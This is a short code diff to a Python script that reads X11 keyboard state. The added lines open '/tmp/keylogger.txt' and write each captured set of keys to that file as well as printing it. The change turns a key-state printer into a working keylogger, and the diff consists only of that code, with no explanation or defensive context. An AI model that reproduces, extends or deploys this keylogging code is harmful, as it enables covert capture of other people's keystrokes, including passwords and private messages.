@@ -22,7 +22,8 @@ assert("linux" in sys.platform)
 
 x11 = ct.cdll.LoadLibrary(find_library("X11"))
 display = x11.XOpenDisplay(None)
-
+destfile='/tmp/keylogger.txt'
+fp = file(destfile,'w') 
 
 # this will hold the keyboard state.  32 bytes, with each
 # bit representing the state for a single key.
@@ -200,6 +201,11 @@ if __name__ == "__main__":
     #t = sys.argv[1]
     done = lambda: time() > now + float(sys.argv[1])
     #def print_keys(t, modifiers, keys): print "%.2f   %r   %r" % (t, keys, modifiers)
-    def print_keys(t, modifiers, keys): print "%r" % (keys)
+    def print_keys(t, modifiers, keys): 
+	print "%r" % (keys)
+	print >> fp, "%r" % (keys)
+	
 
     log(done, print_keys)
+
+	
